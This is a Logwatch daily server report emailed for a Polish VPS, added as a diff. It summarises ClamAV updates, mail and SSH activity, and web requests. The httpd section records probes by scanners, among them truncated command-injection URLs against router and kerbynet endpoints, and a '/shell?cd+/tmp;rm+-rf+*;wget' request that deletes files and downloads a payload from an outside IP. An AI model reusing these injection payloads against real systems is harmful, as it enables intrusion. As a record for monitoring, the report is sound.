@@ -1,0 +1,146 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id C8EA73427BA; Sun, 13 Sep 2020 03:14:10 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200913011410.C8EA73427BA@hrankiety.pl>
+Date: Sun, 13 Sep 2020 03:14:04 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sun Sep 13 03:14:04 2020
+        Date Range Processed: yesterday
+                              ( 2020-Sep-12 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sat Sep 12 03:34:10 2020
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.4
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25927.cdiff [100%]
+    daily.cld updated (version: 25927, sigs: 4313561, f-level: 63, builder: raynman)
+    Can't query daily.25927.93.1.0.6810DB54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (8878557 signatures) from db.local.clamav.net (IP: 104.16.219.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 3 sites probed the server 
+    192.241.219.66
+    41.216.186.89
+    80.82.70.118
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 3 Time(s)
+       /HNAP1/: 1 Time(s)
+       /ftptest.cgi?loginuse=&loginpas=: 2 Time(s)
+       /set_ftp.cgi?loginuse=&loginpas=&next_url= ... +%2Fbin%2Fsh%29: 2 Time(s)
+       login.cgi: 2 Time(s)
+       null: 3 Time(s)
+    404 Not Found
+       /.env: 1 Time(s)
+       /GponForm/diag_Form?images/: 5 Time(s)
+       /HNAP1/: 3 Time(s)
+       /admin//config.php: 3 Time(s)
+       /boaform/admin/formLogin: 4 Time(s)
+       /cgi-bin/kerbynet?Action=StartSessionSubmi ... %26id%26%27&PW=: 1 Time(s)
+       /cgi-bin/kerbynet?Action=x509view&Section= ... =%27%26id%26%27: 1 Time(s)
+       /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HER ... Filter=%26id%26: 1 Time(s)
+       /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HER ... ING&IP=%26id%26: 1 Time(s)
+       /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HER ... erface=%26id%26: 1 Time(s)
+       /cgi-bin/kerbynet?Section=NoAuthREQ&Action ... =%22%26id%26%22: 1 Time(s)
+       /cgi-bin/kerbynet?Section=NoAuthREQ&Action ... ype=*%22;id;%22: 1 Time(s)
+       /dns-query: 1 Time(s)
+       /dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB: 1 Time(s)
+       /login: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181 ... stMode.Rep.Jaws: 1 Time(s)
+       /wp-login.php: 2 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      144   *Warning: Pre-queue content-filter connection overload 
+    10193   SASL authentication failed 
+       78   Miscellaneous warnings 
+ 
+    1.288M  Bytes accepted                         1,350,341
+    1.282M  Bytes delivered                        1,344,151
+ ========   ================================================
+ 
+       41   Accepted                                  23.70%
+      132   Rejected                                  76.30%
+ --------   ------------------------------------------------
+      173   Total                                    100.00%
+ ========   ================================================
+ 
+      131   Reject HELO/EHLO                          99.24%
+        1   Reject unknown user                        0.76%
+ --------   ------------------------------------------------
+      132   Total Rejects                            100.00%
+ ========   ================================================
+ 
+    10220   Connections made      
+       12   Connections lost      
+    10224   Disconnections        
+       41   Removed from queue    
+       39   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   31G   17G  66% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
